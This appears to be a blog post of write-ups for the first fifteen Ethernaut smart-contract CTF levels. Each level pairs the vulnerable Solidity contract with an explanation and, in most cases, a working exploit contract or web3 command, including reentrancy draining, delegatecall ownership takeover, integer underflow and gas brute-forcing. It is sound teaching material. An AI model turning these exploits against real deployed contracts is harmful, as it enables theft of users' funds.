---
title: Ethernaut CTF Writeups I 
date: 2021-10-18
tags: [smart contracts, ethereum, writeup]
slug: ethernaut-ctf-writeups-1
---

# <a name="top"></a> Ethernaut CTF Writeups I

This post contains short writeups for first few challenges of ethernaut. Writeups for the next challenge can be found at [Ethernaut CTF Writeups II](https://s3v3ru5.github.io/notes/ethernaut-ctf-writeups-2)

- [0. Hello Ethernaut](#helloethernaut)
- [1. Fallback](#fallback)
- [2. Fallout](#fallout)
- [3. Coin Flip](#coinflip)
- [4. Telephone](#telephone)
- [5. Token](#token)
- [6. Delegation](#delegation)
- [7. Force](#force)
- [8. Vault](#vault)
- [9. King](#king)
- [10. Re-entrancy](#reentrancy)
- [11. Elevator](#elevator)
- [12. Privacy](#privacy)
- [13. Gatekeeper One](#gatekeeperone)
- [14. Gatekeeper Two](#gatekeepertwo)

---

# <a name="helloethernaut"></a> 0. Hello Ethernaut
\[[top](#top)\]

This is an introductory challenge. Challenge description mentions the method name of the contract to call. calling that method from browser console gives information about another method. A bunch of info methods are linked where calling a method reveals next method name. To complete the challenge we have to find out the password and call "authenticate" method with the password as the parameter. "password" can be obtained by calling the password method itself. Though password method is not metioned while calling other methods we can know that it is defined by checking the contract object in the console. The password is "ethernaut0".

---

# <a name="fallback"></a> 1. Fallback
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

The goal of the challenge is to become owner of the contract and drain its funds. receive function can be used to set the owner. "receive" is a fallback function just like "fallback". "receive" is called when the message call to the contract contains some ether(value) and empty data field. Note that owner can also be changed by contributing large amount of ether to the contract. But contribute method checks that "value" is less than "0.001" ether, so, it would take more than $10^{6}$ contribute method calls to become a owner in this way. Once we become the owner using receive function draining the contract balance is straight forward, it can be done by calling the withdraw function.

---

# <a name="fallout"></a> 2. Fallout
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

The goal of this challenge is to become owner of the contract. The bug is in the definition of the constructor function. A constructor is a function which is generally used to intialise state variables while deploying the contract. The constructor function can only be called at the time of deployment and cannot be called once deployed. With solidity version `^0.6.0`, a constructor can be defined using the name of the contract like following

```solidity
contract ContractName {
    function ContractName() ... {
        ...
    }
    ...
}
```

In the challenge contract, there's a typo in the constructor function name "Fal1out". This is not same as the contract name as a result this function is no longer a constructor and can be called even after deploying the contract. As the constructor is used to set the owner to `msg.sender` and because of a typo we can call this function and set owner variable to our address.

---

# <a name="coinflip"></a> 3. Coin Flip
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

We have to call flip method with a guess and it is considered a win if our guess matches with the contract calculated guess. we have to guess the flip correctly 10 times in line to complete the challenge. The bug is in the calculation of the contract filp, it is calculated solely based on the block hash of the block the transaction is in. The block hash will be same for every other transaction included in the same block as the flip method call transaction. so, the idea is to calculate the "guess" using our exploit smart contract and call the challenge smart contract using message call with the calculated guess.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip coinFlip;
    
    constructor(address coinFlipInstance) {
        coinFlip = CoinFlip(coinFlipInstance);
    }

    function flipAndSubmit() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        require(lastHash != blockValue);
        
        lastHash = blockValue;
        uint256 toss  = blockValue / FACTOR;
        bool side = toss == 1 ? true : false;
   
        require(coinFlip.flip(side));
    }
}
```

"flipAndSubmit" should be called in 10 different transactions one after other as every flip method call should be in a different block.

---

# <a name="telephone"></a> 4. Telephone
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

We have to become the owner of the challenge contract. Anyone can call the changeOwner with a new owner address but to change the owner to passed "_owner" argument, a condition must be true which is

```solidity
    if (tx.origin != msg.sender)
```

"tx.origin" is equal to the address created the transaction and "msg.sender" is equal to the address which created the message. Calling another contract is also a message call. so, when we call a different smart contract which inturn calls the challenge contract, the "tx.origin" will be our address whereas the "msg.sender" will be the address of intermediate smart contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
  function changeOwner(address _owner) external;
}

contract TelephoneExploit {
    Telephone telephone;
    
    constructor(address telephoneInstance) {
        telephone = Telephone(telephoneInstance);
    }
    
    function changeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
```

---

# <a name="token"></a> 5. Token
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

Intially, we have 20 tokens which are represented using "balances" map. The contract also has methods to transfer and check balance of an address. To complete this challenge we should have more tokens in our balance than the intial amount. The bug is in the "transfer" function, before subtracting the transfered amount from the sender's balance it doesn't check correctly whether the sender has sufficient balance or not. As a result, when amount larger than the sender's balance is subtracted, due to integer underflow, the final value will be much much larger. "uint" type is used for balances whose range is $[0, 2^{256} - 1]$, so, when large value is subtracted from a smaller value, the final result will be a large value in the order of $2^{256}$. The final exploit is to call "transfer" method random "_to" address and slightly larger value than the balance.

---

# <a name="delegation"></a> 6. Delegation
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

The fallback function has a delegate call to "Delegate" contract. In delegate call, the code present in the called contract is executed in the context of caller contract. The context includes storage and msg object among others. contract storage is presistent, it's a way to store contract state between different message calls. storage can be viewed as a large mapping from "uint" to bytes32. So, whenever a state variable is read or written it is done so by reading or writing to storage slot(index) assigned to that variable. Similarly, when the code modifying state variables is executed in delegate call, the storage slot of caller contract corresponding to that state variable in the called contract is modified. For example, "pwn" function in the "Delegate" contract modifies "owner" state variable which is stored in "0" storage slot. when the "pwn" function is executed using delegate call in "Delegation" contract's fallback function, the storage slot of "Delegation" contract is read and modified not the storage slot of "Delegate" contract. As the storage slot "0" of "Delegation" contract corresponds to it's "owner" variable, delegate call to "pwn" function will modify the "Delegation" contract's "owner" variable, which is what we need to pass this challenge.

To call "pwn" function, we have to compute encoded function signature of "pwn" function in message data. Encoded function signature is first 4 bytes of keccak256 hash of function signature. It is used to identify the function in the called contract. And to call the "pwn" function in delegate call, we have to pass it's signature in message data.
The final exploit is
```js
await sendTransaction({from: player, to: instance, data: "0xdd365b8b"})
```

---

# <a name="force"></a> 7. Force
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

To complete this challenge, the challenge contract should have some amount of ether. We cannot send ether to this contract like we do for other contracts, that's because, a contract function should be defined as payable to receive ether. And there are no payable functions in this contract. Even though solidity compiler puts default implementations of "receive" and "fallback", they are not payable by default. so, we cannot send ether using any kind of message call. 

But there are two other ways using which we can send ether. We can send ether to the contract before the contract is deployed. The address of the deployed contract can be calculated as it only depends on the deployer address and nonce. And if we send ether to that address before the contract is deployed, there will be no code at that address and the transaction will not be reverted. The message calls containing ether are only reverted because solidity by default adds conditions for non-payable functions to check that "msg.value" is 0, but if the code is not yet deployed, then the transaction will not be reverted. Another way is by using selfdestruct. when a contract calls self destruct, all it's balance is transfered to the address given as it's argument and even if a smart contract presents at the given address, no function is called, as a result ether is sent to that contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceExploit {
    constructor(address payable forceInstance) payable {
        selfdestruct(forceInstance);
    }
}
```

---

# <a name="vault"></a> 8. Vault
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

We have to set "locked" variable to "false" to complete this challenge. To unlock the contract, we can use unlock method but it requires a password. password is stored in "password" private variable. Even if the password is "private", we can read it's value. The difference between "public" and "private" variable is not that "public" variables can be read by anyone and "private" variables can only be read by the contract. What it means is that, when a variable is marked "public" in solidity, solidity compiler creates public getter function for that variable and  won't create for "private" variables. Irrespective of variable visibility, all the state variables are stored in storage of the contract. And contract storage is part of the blockchain state, which anyone can read with access to a network node. But the benefit of declaring variables "private" is that, they cannot be read by other smart contracts. To be exact, no contract can read other contracts storage, so, to allow reading public variables solidity creates public getter function which allow reading public variables using a message call. "web3" provides helper functions to read storage of an address based on the slot number. "password" variable is stored in storage slot 1 and using web3 we can read the password and call unlock with it.

```js
password = await web3.eth.getStorageAt(instance, 1)
```

---

# <a name="king"></a> 9. King
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

Anyone can become the king in the challenge contract if they send more ether than the present king's ether. To complete this challenge, we have to block anyone else from becoming the king, even if they send large amount of ether. We can do that by using the "fallback" function. remember that, when ether is sent with empty data or false data, one of the fallback function is called and if the fallback function "reverts" everytime, then it won't be possible to transfer ether using "transfer" function. The challenge contract's receive function transfer's the previous king's ether before updating the king to the new one. So, if the previous king's ether transfer fails everytime, then no one can become the king.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingExploit {
    constructor(address payable kingInstance) public payable {
        require(msg.value >= 1 ether);
        kingInstance.call{value: 1 ether}("");
    }
    
    fallback() external payable {
        revert();
    }
}
```

---

# <a name="reentrancy"></a> 10. Re-entrancy
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

To complete this challenge, we have to steal all the ether present in the contract's account. The bug is in the "withdraw" function. Even though, it checks whether the withdraw amount is greater then the balance, the state i.e balance after withdraw, is only updated after sending the ether by making an "external call". To see why this is dangerous, remember that we can implement "fallback" functions which will be called when data field is empty or it doesn't match any function signature. So, when the challenge contract sends ether, if receiving account is not a externally owned account, then that account has the ability to transfer the execution to any other contract or just finish and return to the challenge contract. if the "fallback" function just returns without doing anything then everything works as intended but if "fallback" function calls "withdraw" function again, as the balance is not yet updated, it will result in the transfer of ether using "call" to the same contract. recursively, we can steal all the ether present in the challenge contract. Note that, "call" transfers all the available gas when not set explicitly and this attack could be prevented by sending particular amount of gas not enough for re-entrancy.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Reentrance {
  
  function donate(address _to) external payable;
  function balanceOf(address _who) external view returns (uint balance);
  function withdraw(uint _amount) external;
  receive() external payable;
}

contract ReentranceExploit {
    Reentrance reentrace;
    address payable public owner;
    uint256 value;
    bool private attacking;
    
    constructor(address payable reentraceInstance) payable public {
        reentrace = Reentrance(reentraceInstance);
        owner = msg.sender;
        value = msg.value;
        reentrace.donate{value: msg.value}(address(this));
    }
    
    function withdraw() public {
        owner.transfer(address(this).balance);
    }
    
    function startAttack() public {
        reentrace.withdraw(value);
    }
    
    receive() external payable {
        if (!attacking) {
            attacking = true;
            while (address(reentrace).balance >= value) {
                reentrace.withdraw(value);
            }
            reentrace.withdraw(address(reentrace).balance);
            attacking = false;
        }
    }
}
```

---

# <a name="elevator"></a> 11. Elevator
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

we have to set "top" variable to true to pass this challenge. "goTo" function is expected to be called from a Building contract and to set "top" to "true", on the first call of "isLastFloor", it has to return "false" and on the second call, it should return "true". We can use a state variable to track "isLastFloor" calls and return appropriate boolean based on that.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Elevator {
    function goTo(uint _floor) external;
}

contract Building {
    bool private check = false;
    
    function isLastFloor(uint floor) external returns (bool) {
        
        if (check) {
            return true;
        } else {
            check = true;
            return false;
        }
    }
    
    function start(address elevatorInstance) public {
        Elevator elevator = Elevator(elevatorInstance);
        elevator.goTo(10);
    }
}
```

---

# <a name="privacy"></a> 12. Privacy
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

This challenge is similar "Vault" challenge, in this we have to read private "data" variable and call "unlock" function with it. solidity follows few rules while allocating storage slots to state variables, they can be best understood by reading through solidity docs, you can find them \[[here](https://docs.soliditylang.org/en/v0.8.9/internals/layout_in_storage.html)\].

The "data[2]" is stored at slot 5 and bytes16 of bytes32 value returns first 16 bytes. so, we can read the slot 5 and call unlock using most significant 16 bytes.

---

# <a name="gatekeeperone"></a> 13. Gatekeeper One
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

This challenge requires us to pass 3 gates, each representing a condition using modifiers and require statements. "gateOne" is the same condition as "Telephone" challenge. coming to "gateTwo", it checks if gasleft modulo 8191 is 0 or not. gasleft is the amount of gas remaining for rest of the execution. When calling from a contract, we can set the amount of gas we want to forward, so, that gas amount can be bruteforced until this check passes. "gateThree" depends on the uint conversion. When a uint is converted to a lower size "uint", the resulting value will be lower size bits of the original value. So, to pass

```solidity
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
```

uint16 takes lower 16 bits, whereas uint32 takes lower 32 bits, to make them to be equal we can set bits 16-31 to 0 given bits are numbered with lsb as 0.

```solidity
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
```

upper 32 bits of uint64(_gateKey) should not be 0. The last check is

```solidity
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
```

This requires lower 16 bits to be equal lower 16 bits of tx.origin.

final exploit is
```solidity
contract GateKeeperOneExploit {
    constructor(address gateKeeperInstance) public {
        
        uint64 key = 0;
        key = key ^ uint16(tx.origin);
        key = key ^ (1 << 32);
        uint gasLimit = 5000000;
        for (uint i = 0; i < 8191; i++) {
            (bool check, bytes memory result) = gateKeeperInstance.call{gas: gasLimit + i}(abi.encodeWithSignature("enter(bytes8)", bytes8(key)));
            if (check) {
                break;
            }
        }
    }
    
}
```

---

# <a name="gatekeepertwo"></a> 14. Gatekeeper Two
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

This challenge as above challenge requires us to pass three gates. first gate is same while second gate checks if the caller is smart contract or not. "extcodesize" returns the length of the code in bytes at the given address, this gate requires it to be 0. But "gateOne" requires caller to be a smart contract. The solution for this is to call this contract from the constructor. When called from the constructor, the contract's final code is not yet returned to the evm and it will only be done after finishing this call, as a result the codesize will still be 0 at the caller's address. so, "extcodesize" returns 0 when called from the constructor allowing us to pass this gate. "gateThree" checks the passed "gateKey" using "xor" operation. we can change the variables in the equation and find the required "gateKey" easily.

```solidity
pragma solidity ^0.6.0;

contract GateKeeperOneExploit {
    constructor(address gateKeeperInstance) public {
        uint64 key = 0;
        key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1);
        gateKeeperInstance.call(abi.encodeWithSignature("enter(bytes8)", bytes8(key)));
    }
}
```

